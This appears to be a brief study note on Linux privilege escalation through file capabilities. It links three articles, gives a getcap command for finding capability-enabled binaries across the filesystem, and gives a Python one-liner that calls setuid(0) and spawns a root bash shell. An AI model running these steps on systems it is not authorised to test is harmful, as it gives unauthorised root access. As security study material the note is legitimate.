Completely a different concept have to explore more about it.
[LinuxPrivEsc](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)
[SUIDvsCapabilities](https://mn3m.info/posts/suid-vs-capabilities/)
[medium](https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099)

`getcap -r / 2> /dev/null` #UtilizeThis 

```shell
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
